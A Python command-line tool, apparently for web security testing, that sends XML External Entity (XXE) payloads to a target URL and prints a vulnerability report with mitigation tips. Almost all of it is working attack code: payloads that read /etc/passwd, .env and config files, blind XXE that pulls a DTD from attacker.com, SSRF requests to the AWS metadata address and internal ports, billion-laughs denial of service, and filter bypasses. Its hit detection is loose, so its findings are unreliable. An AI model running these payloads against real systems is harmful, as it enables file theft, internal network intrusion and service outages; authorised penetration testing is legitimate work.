#!/usr/bin/env python3

import requests
import sys
import time
import urllib.parse
from xml.etree import ElementTree as ET
import warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class XXEExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.vulnerabilities_found = []
    
    def banner(self):
        print("=" * 70)
        print("üîç XML EXTERNAL ENTITIES (XXE) VULNERABILITY TESTER")
        print("=" * 70)
        print(f"Target: {self.target_url}")
        print(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 70)
    
    def test_basic_xxe_file_disclosure(self):
        """Test basic XXE file disclosure vulnerabilities"""
        print("\nüîç [1/6] Testing Basic XXE File Disclosure...")
        
        xxe_payloads = [
            # Basic file disclosure payloads
            {
                'name': 'Linux /etc/passwd disclosure',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'''
            },
            {
                'name': 'Windows system32 disclosure',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>
<root>&xxe;</root>'''
            },
            {
                'name': 'Local file with PHP wrapper',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>'''
            },
            {
                'name': 'Application config file',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///../config.php">
]>
<root>&xxe;</root>'''
            },
            {
                'name': 'Environment file disclosure',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///.env">
]>
<root>&xxe;</root>'''
            }
        ]
        
        for test in xxe_payloads:
            print(f"   Testing: {test['name']}")
            
            # Test via XML endpoint
            success = self.send_xxe_payload(test['payload'], test['name'])
            
            if success:
                print(f"   ‚úÖ SUCCESS: {test['name']}")
                self.vulnerabilities_found.append(f"XXE File Disclosure - {test['name']}")
            else:
                print(f"   ‚ùå Failed: {test['name']}")
        
        print(f"   üìä File disclosure tests completed. Found: {len([v for v in self.vulnerabilities_found if 'File Disclosure' in v])}")
    
    def test_blind_xxe(self):
        """Test blind XXE vulnerabilities"""
        print("\nüîç [2/6] Testing Blind XXE Vulnerabilities...")
        
        # External DTD server simulation (in real testing, you'd use your own server)
        external_dtd_url = "http://attacker.com/malicious.dtd"
        
        blind_xxe_payloads = [
            {
                'name': 'Blind XXE with external DTD',
                'payload': f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root SYSTEM "{external_dtd_url}">
<root>test</root>'''
            },
            {
                'name': 'Blind XXE with parameter entity',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % blind SYSTEM "http://attacker.com/blind.dtd">
%blind;
]>
<root>test</root>'''
            },
            {
                'name': 'Error-based blind XXE',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
<root>test</root>'''
            }
        ]
        
        for test in blind_xxe_payloads:
            print(f"   Testing: {test['name']}")
            
            success = self.send_xxe_payload(test['payload'], test['name'], check_response=False)
            
            if success:
                print(f"   ‚ö†Ô∏è  POTENTIAL: {test['name']} (manual verification needed)")
                self.vulnerabilities_found.append(f"Blind XXE - {test['name']}")
            else:
                print(f"   ‚ùå Failed: {test['name']}")
        
        print(f"   üìä Blind XXE tests completed. Found: {len([v for v in self.vulnerabilities_found if 'Blind XXE' in v])}")
    
    def test_ssrf_via_xxe(self):
        """Test Server-Side Request Forgery via XXE"""
        print("\nüîç [3/6] Testing SSRF via XXE...")
        
        ssrf_payloads = [
            {
                'name': 'Internal network scan - localhost',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://127.0.0.1:22">
]>
<root>&xxe;</root>'''
            },
            {
                'name': 'Internal service discovery',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://localhost:3000/admin">
]>
<root>&xxe;</root>'''
            },
            {
                'name': 'Cloud metadata access (AWS)',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>'''
            },
            {
                'name': 'Internal FTP service',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "ftp://localhost/test">
]>
<root>&xxe;</root>'''
            },
            {
                'name': 'Internal database port scan',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://localhost:3306">
]>
<root>&xxe;</root>'''
            }
        ]
        
        for test in ssrf_payloads:
            print(f"   Testing: {test['name']}")
            
            success = self.send_xxe_payload(test['payload'], test['name'])
            
            if success:
                print(f"   ‚úÖ SUCCESS: {test['name']}")
                self.vulnerabilities_found.append(f"SSRF via XXE - {test['name']}")
            else:
                print(f"   ‚ùå Failed: {test['name']}")
        
        print(f"   üìä SSRF via XXE tests completed. Found: {len([v for v in self.vulnerabilities_found if 'SSRF via XXE' in v])}")
    
    def test_dos_via_xxe(self):
        """Test Denial of Service attacks via XXE"""
        print("\nüîç [4/6] Testing DoS via XXE (Billion Laughs)...")
        
        dos_payloads = [
            {
                'name': 'Billion Laughs Attack',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
]>
<root>&lol6;</root>'''
            },
            {
                'name': 'Quadratic Blowup Attack',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
]>
<root>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</root>'''
            },
            {
                'name': 'External Entity DoS',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///dev/random">
]>
<root>&xxe;</root>'''
            }
        ]
        
        for test in dos_payloads:
            print(f"   Testing: {test['name']} (with timeout protection)")
            
            try:
                start_time = time.time()
                success = self.send_xxe_payload(test['payload'], test['name'], timeout=5)
                response_time = time.time() - start_time
                
                if response_time > 4:
                    print(f"   ‚ö†Ô∏è  POTENTIAL DoS: {test['name']} (Response time: {response_time:.2f}s)")
                    self.vulnerabilities_found.append(f"DoS via XXE - {test['name']}")
                elif success:
                    print(f"   ‚úÖ Processed: {test['name']} (may indicate vulnerability)")
                else:
                    print(f"   ‚ùå Rejected: {test['name']}")
                    
            except Exception as e:
                print(f"   ‚ö†Ô∏è  TIMEOUT/ERROR: {test['name']} - Potential DoS vulnerability")
                self.vulnerabilities_found.append(f"DoS via XXE - {test['name']} (timeout)")
        
        print(f"   üìä DoS via XXE tests completed. Found: {len([v for v in self.vulnerabilities_found if 'DoS via XXE' in v])}")
    
    def test_xxe_in_different_contexts(self):
        """Test XXE in different application contexts"""
        print("\nüîç [5/6] Testing XXE in Different Contexts...")
        
        contexts = [
            {
                'endpoint': '/xml',
                'method': 'GET',
                'param': 'xml',
                'description': 'XML parameter in GET request'
            },
            {
                'endpoint': '/xml',
                'method': 'POST',
                'param': 'data',
                'description': 'XML data in POST body'
            },
            {
                'endpoint': '/api/upload',
                'method': 'POST',
                'param': 'file',
                'description': 'XML file upload'
            },
            {
                'endpoint': '/config',
                'method': 'POST',
                'param': 'config',
                'description': 'Configuration XML'
            }
        ]
        
        basic_xxe = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'''
        
        for ctx in contexts:
            print(f"   Testing: {ctx['description']}")
            
            try:
                if ctx['method'] == 'GET':
                    params = {ctx['param']: basic_xxe}
                    response = self.session.get(f"{self.target_url}{ctx['endpoint']}", 
                                             params=params, timeout=10)
                else:
                    if ctx['param'] == 'file':
                        files = {'file': ('xxe_test.xml', basic_xxe, 'application/xml')}
                        response = self.session.post(f"{self.target_url}{ctx['endpoint']}", 
                                                   files=files, timeout=10)
                    else:
                        data = {ctx['param']: basic_xxe}
                        headers = {'Content-Type': 'application/xml'}
                        response = self.session.post(f"{self.target_url}{ctx['endpoint']}", 
                                                   data=basic_xxe, headers=headers, timeout=10)
                
                if self.analyze_xxe_response(response, 'Context test'):
                    print(f"   ‚úÖ SUCCESS: XXE in {ctx['description']}")
                    self.vulnerabilities_found.append(f"XXE Context - {ctx['description']}")
                else:
                    print(f"   ‚ùå No XXE: {ctx['description']}")
                    
            except Exception as e:
                print(f"   ‚ùå Error testing {ctx['description']}: {str(e)}")
        
        print(f"   üìä Context-based XXE tests completed.")
    
    def test_xxe_filter_bypass(self):
        """Test XXE filter bypass techniques"""
        print("\nüîç [6/6] Testing XXE Filter Bypass Techniques...")
        
        bypass_payloads = [
            {
                'name': 'HTML entity encoding',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file&#58;//&#47;etc&#47;passwd">
]>
<root>&xxe;</root>'''
            },
            {
                'name': 'UTF-8 encoding bypass',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'''.encode('utf-16')
            },
            {
                'name': 'Parameter entity bypass',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY xxe '%file;'>">
%eval;
]>
<root>&xxe;</root>'''
            },
            {
                'name': 'Nested entity bypass',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY nested "file:///etc/passwd">
<!ENTITY xxe SYSTEM "&nested;">
]>
<root>&xxe;</root>'''
            },
            {
                'name': 'CDATA bypass attempt',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><![CDATA[&xxe;]]></root>'''
            }
        ]
        
        for test in bypass_payloads:
            print(f"   Testing: {test['name']}")
            
            if isinstance(test['payload'], bytes):
                success = self.send_raw_xxe_payload(test['payload'], test['name'])
            else:
                success = self.send_xxe_payload(test['payload'], test['name'])
            
            if success:
                print(f"   ‚úÖ SUCCESS: {test['name']}")
                self.vulnerabilities_found.append(f"XXE Filter Bypass - {test['name']}")
            else:
                print(f"   ‚ùå Failed: {test['name']}")
        
        print(f"   üìä XXE bypass tests completed. Found: {len([v for v in self.vulnerabilities_found if 'Bypass' in v])}")
    
    def send_xxe_payload(self, payload, test_name, check_response=True, timeout=10):
        """Send XXE payload to the target application"""
        try:
            # Try multiple endpoints and methods
            endpoints = ['/xml', '/api/xml', '/process-xml', '/upload']
            
            for endpoint in endpoints:
                # GET method with parameter
                try:
                    params = {'xml': payload}
                    response = self.session.get(f"{self.target_url}{endpoint}", 
                                              params=params, timeout=timeout)
                    if check_response and self.analyze_xxe_response(response, test_name):
                        return True
                except:
                    pass
                
                # POST method with XML data
                try:
                    headers = {'Content-Type': 'application/xml'}
                    response = self.session.post(f"{self.target_url}{endpoint}", 
                                               data=payload, headers=headers, timeout=timeout)
                    if check_response and self.analyze_xxe_response(response, test_name):
                        return True
                except:
                    pass
                
                # POST method with form data
                try:
                    data = {'xml': payload}
                    response = self.session.post(f"{self.target_url}{endpoint}", 
                                               data=data, timeout=timeout)
                    if check_response and self.analyze_xxe_response(response, test_name):
                        return True
                except:
                    pass
            
            return not check_response  # For blind XXE tests
            
        except Exception as e:
            print(f"     Error sending payload: {str(e)}")
            return False
    
    def send_raw_xxe_payload(self, payload, test_name):
        """Send raw XXE payload (for encoded payloads)"""
        try:
            headers = {'Content-Type': 'application/xml; charset=utf-16'}
            response = self.session.post(f"{self.target_url}/xml", 
                                       data=payload, headers=headers, timeout=10)
            return self.analyze_xxe_response(response, test_name)
        except Exception as e:
            print(f"     Error sending raw payload: {str(e)}")
            return False
    
    def analyze_xxe_response(self, response, test_name):
        """Analyze response for XXE vulnerability indicators"""
        if response.status_code == 200:
            response_text = response.text.lower()
            
            # File disclosure indicators
            file_indicators = [
                'root:', 'daemon:', 'bin:', 'sys:',  # /etc/passwd
                '127.0.0.1', 'localhost',            # hosts file
                'password', 'secret', 'key',         # config files
                'mysql_connect', 'database',         # DB configs
                '<?php', '<?xml'                     # Source code
            ]
            
            # Error indicators that might reveal XXE processing
            error_indicators = [
                'xml', 'entity', 'dtd', 'external',
                'file not found', 'permission denied',
                'failed to load', 'parser error'
            ]
            
            # Check for successful file disclosure
            if any(indicator in response_text for indicator in file_indicators):
                print(f"     üí• File content detected in response!")
                return True
            
            # Check for XXE-related errors
            if any(indicator in response_text for indicator in error_indicators):
                print(f"     ‚ö†Ô∏è  XXE processing detected (error-based)")
                return True
            
            # Check response length and unusual content
            if len(response.text) > 1000:
                print(f"     ‚ÑπÔ∏è  Large response received ({len(response.text)} chars)")
                return True
        
        return False
    
    def generate_report(self):
        """Generate comprehensive XXE vulnerability report"""
        print("\n" + "=" * 70)
        print("üìã XXE VULNERABILITY ASSESSMENT REPORT")
        print("=" * 70)
        
        print(f"üéØ Target: {self.target_url}")
        print(f"üìÖ Date: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"üîç Total XXE Vulnerabilities Found: {len(self.vulnerabilities_found)}")
        
        if self.vulnerabilities_found:
            print("\nüö® XXE VULNERABILITIES IDENTIFIED:")
            print("-" * 50)
            
            vuln_categories = {}
            for vuln in self.vulnerabilities_found:
                category = vuln.split(' - ')[0]
                if category not in vuln_categories:
                    vuln_categories[category] = []
                vuln_categories[category].append(vuln)
            
            for category, vulns in vuln_categories.items():
                print(f"\nüìÇ {category.upper()}:")
                for vuln in vulns:
                    print(f"   ‚Ä¢ {vuln}")
            
            # Risk assessment
            critical_vulns = [v for v in self.vulnerabilities_found if any(x in v for x in ['File Disclosure', 'SSRF'])]
            high_vulns = [v for v in self.vulnerabilities_found if 'DoS' in v]
            
            print(f"\nüî• RISK ASSESSMENT:")
            if critical_vulns:
                print(f"   üö® CRITICAL: {len(critical_vulns)} critical XXE vulnerabilities")
            if high_vulns:
                print(f"   ‚ö†Ô∏è  HIGH: {len(high_vulns)} high-risk XXE issues")
            
        else:
            print("\n‚úÖ No XXE vulnerabilities detected")
        
        print("\nüìù XXE MITIGATION RECOMMENDATIONS:")
        print("-" * 40)
        print("1. Disable XML external entity processing in XML parsers")
        print("2. Use less complex data formats like JSON when possible")
        print("3. Implement input validation and sanitization")
        print("4. Use XML parsers with XXE protection enabled by default")
        print("5. Implement proper error handling to avoid information disclosure")
        print("6. Use whitelist-based input validation")
        print("7. Keep XML libraries and parsers updated")
        print("8. Implement network segmentation to limit SSRF impact")
        print("9. Monitor and log XML processing activities")
        print("10. Use Content Security Policy (CSP) headers")
        
        print("\n" + "=" * 70)
    
    def run_comprehensive_test(self):
        """Run all XXE vulnerability tests"""
        self.banner()
        
        try:
            print(f"\nüîÑ Testing connectivity to {self.target_url}...")
            response = requests.get(self.target_url, timeout=5)
            if response.status_code != 200:
                print(f"‚ùå Target not accessible (Status: {response.status_code})")
                return
            print(f"‚úÖ Target is accessible")
        except requests.exceptions.RequestException as e:
            print(f"‚ùå Cannot connect to target: {e}")
            return
        
        # Run all XXE tests
        self.test_basic_xxe_file_disclosure()
        self.test_blind_xxe()
        self.test_ssrf_via_xxe()
        self.test_dos_via_xxe()
        self.test_xxe_in_different_contexts()
        self.test_xxe_filter_bypass()
        
        # Generate comprehensive report
        self.generate_report()

def main():
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        print("üîç OWASP Top 10 - XML External Entities (XXE) Tester")
        print("=" * 55)
        print("Usage: python3 xxe_exploit.py <target_url>")
        print("Example: python3 xxe_exploit.py http://localhost:3000")
        print("\nThis tool will test for XXE vulnerabilities:")
        print("‚Ä¢ Basic XXE File Disclosure")
        print("‚Ä¢ Blind XXE Attacks")
        print("‚Ä¢ SSRF via XXE")
        print("‚Ä¢ DoS via XXE (Billion Laughs)")
        print("‚Ä¢ XXE in Different Contexts")
        print("‚Ä¢ XXE Filter Bypass Techniques")
        sys.exit(1)
    
    tester = XXEExploit(target_url)
    tester.run_comprehensive_test()

if __name__ == "__main__":
    main()